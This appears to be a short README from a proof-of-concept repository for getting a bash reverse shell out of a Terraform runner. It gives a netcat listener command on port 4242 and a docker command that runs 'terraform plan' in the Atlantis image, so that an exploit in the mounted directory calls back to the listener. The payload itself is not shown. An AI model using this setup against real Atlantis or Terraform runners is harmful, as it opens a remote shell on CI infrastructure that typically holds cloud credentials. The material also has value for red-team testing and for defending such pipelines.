But with bash reverse shell, as on terraform runner

# Testing with atlantis locally

## One terminal tab (either locally or on different host)
```bash
nc -vklp  4242
```

## Second terminal tab (either same host or remote host)

```bash
# `--net=host` is only needed if you want to connect to same host, where docker container is running
# Then in exploit, you need to use as remote address `host.docker.internal` as equivalent to `localhost` pointing from container to its host system
docker run --net=host -v "$(pwd)":/app -it ghcr.io/runatlantis/atlantis bash -c "cd /app; terraform plan"
```
